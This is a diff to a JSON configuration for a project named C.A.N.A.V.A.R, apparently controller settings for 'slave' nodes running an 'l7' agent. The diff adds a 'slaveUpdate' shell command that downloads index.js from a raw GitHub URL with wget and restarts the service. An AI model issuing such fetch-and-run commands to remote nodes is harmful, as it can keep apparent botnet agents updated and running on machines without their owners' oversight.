@@ -8,7 +8,8 @@
     "download_modules": "npm install express fs axios events moment delay quick.db child_process systeminformation",
     "scriptdir": "/[slaveNick[/scripts/",
     "agentLink": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/index.js",
-    "serviceLink": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/canavarl7.service"
+    "serviceLink": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/canavarl7.service",
+    "slaveUpdate": "cd /[slaveNick[/; wget [agentLink[ -O index.js; systemctl restart [serviceName["
   },
   "scripts": [
     {
